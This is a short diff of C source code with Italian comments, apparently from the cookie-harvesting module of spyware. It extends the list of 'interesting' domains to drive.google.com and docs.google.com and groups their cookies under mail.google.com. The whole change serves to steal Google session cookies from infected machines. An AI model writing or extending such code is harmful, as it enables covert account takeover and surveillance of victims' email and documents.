@@ -23,6 +23,14 @@ BOOL IsInterestingDomainW(WCHAR *domain)
 	if (!wcscmp(domain, L"google.com"))
 		return TRUE;
 
+	////google drive cookies
+	if (!wcscmp(domain, L"drive.google.com"))
+		 return TRUE;
+
+	if (!wcscmp(domain, L"docs.google.com"))
+		 return TRUE;
+	/////
+
 	return FALSE;
 }
 
@@ -130,7 +138,8 @@ BOOL AddCookieA(char *domain_tmp, char *name, char *value)
 		return FALSE;
 
 	// Workaround per i cookie segnati sul dominio principale
-	if (!_stricmp("google.com", domain_tmp))
+	//if (!_stricmp("google.com", domain_tmp))
+	if ((!_stricmp("google.com", domain_tmp)) || (!_stricmp("drive.google.com", domain_tmp)) || (!_stricmp("docs.google.com", domain_tmp)))
 		_snprintf_s(domain, sizeof(domain), _TRUNCATE, "mail.google.com");
 	else
 		_snprintf_s(domain, sizeof(domain), _TRUNCATE, "%s", domain_tmp);
